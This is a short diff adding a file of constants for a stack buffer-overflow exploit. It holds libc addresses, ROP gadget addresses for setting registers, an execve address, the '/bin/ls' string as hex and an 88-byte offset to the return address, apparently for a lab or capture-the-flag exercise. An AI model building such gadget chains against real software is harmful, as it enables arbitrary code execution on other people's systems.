@@ -1,0 +1,10 @@
+bin_ls = 0x2f62696e2f6c7300
+libc_start = 0x7ffff7de5000
+libc_end = 0x7ffff7f3f000
+addr_gadget_rdi = 0x7ffff7e8ba17
+addr_gadget_rsi = 0x7ffff7e8a9dc
+addr_gadget_rdx = 0x7ffff7e8bb8d
+addr_execve = 0x7ffff7e8c080
+buffer_addr = 0x7fffffffe610
+offset_buf_to_ret_addr = 88
+
